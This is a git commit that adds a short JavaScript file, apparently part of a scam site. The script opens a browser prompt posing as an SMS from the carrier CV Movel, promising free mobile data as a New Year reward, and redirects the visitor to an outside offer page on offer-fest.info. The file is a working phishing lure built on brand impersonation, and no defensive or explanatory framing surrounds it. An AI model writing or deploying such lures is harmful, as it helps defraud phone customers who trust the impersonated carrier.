34137257b4eb6033f1ac7dab8d36273d9cca21a4
ekpesense <abantak9@gmail.com>
2025-01-27 00:57:22 -0800

    Create ativation-cvmovel.js

---
+++ ativation-cvmovel.js
@@ -0,0 +1,5 @@
+var password = 'PRESENTE DE ANO NOVO'
+password=prompt('CV MOVEL SMS: Caro cliente da Cv Movel, receba dados grátis de 5 GB a 100 GB, recompensa para clientes de ano novo, Clique PRESENTE DE ANO NOVO Para verificar agora ','PRESENTE DE ANO NOVO');
+if (password != 'PRESENTE DE ANO NOVO') {
+location.href='https://offer-fest.info/cvmovel.html';
+}
